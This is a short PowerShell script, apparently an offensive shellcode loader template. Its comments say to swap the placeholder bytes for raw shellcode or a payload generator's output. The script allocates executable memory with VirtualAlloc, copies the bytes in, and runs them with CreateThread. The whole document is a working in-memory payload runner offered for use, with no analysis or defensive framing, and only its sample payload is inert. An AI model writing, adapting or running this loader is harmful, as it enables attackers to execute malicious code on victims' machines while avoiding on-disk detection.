# PowerShell x64 loader. Replace the byte array with the raw shellcode
# (or paste the PS1 output of the payload generator directly).
$payload = @(
  0x90, 0x90, 0xcc
)

$code = [Byte[]]$payload
Add-Type -Namespace W -Name M -MemberDefinition @"
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr CreateThread(IntPtr a, UIntPtr s, IntPtr f, IntPtr p, uint x, IntPtr i);
"@
$ptr = [W.M]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]$code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($code, 0, $ptr, $code.Length)
[W.M]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
